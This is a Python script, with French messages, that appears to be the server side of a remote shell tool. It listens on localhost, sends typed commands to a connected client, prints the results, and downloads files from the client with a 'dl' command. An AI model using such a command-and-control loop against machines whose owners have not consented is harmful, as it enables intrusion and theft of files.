""" SERVEUR """

import socket

HOST_IP = "localhost"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

def socket_data(socket, data_len):
    current_data_len = 0
    total_data = None
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket.recv(chunk_len)
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)  
    return total_data

def commande_exe(socket, commande):
    if not commande:
        return None
    socket.sendall(commande.encode())
    
    header_data = socket_data(socket, 13)
    longueur_data = int(header_data.decode())
    
    data_recus = socket_data(socket, longueur_data)
    return data_recus   

log = socket.socket()
log.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
log.bind((HOST_IP, HOST_PORT))
log.listen()

print(f"Etablissement d'une connexion sur {HOST_IP}, port {HOST_PORT}...")
connexion_socket, adresse_client = log.accept()
print(f"Connexie établie au client {adresse_client}")

dl_filename = None

while True:
    infos_system = commande_exe(connexion_socket, "system")
    if not infos_system:
        break
    commande = input(adresse_client[0] +">"+str(adresse_client[1])+ " " + infos_system.decode() + " > ")
    
    repertoire = commande.split(" ")
    if len(repertoire) == 2 and repertoire[0] == "dl":
        dl_filename = repertoire[1]
        
    
    data_recus = commande_exe(connexion_socket, commande)

    if not data_recus:
        break
    
    if dl_filename:
        if len(data_recus) == 1 and data_recus ==  b" ":
            print("Le fichier n'existe pas", dl_filename, "n'existe pas")
        else:
            f = open(dl_filename, "wb")
            f.write(data_recus)
            f.close()
            print("Fichier", dl_filename, "Téléchargé.")
        dl_filename = None
    else:
        print(data_recus.decode())    


log.close
connexion_socket.close()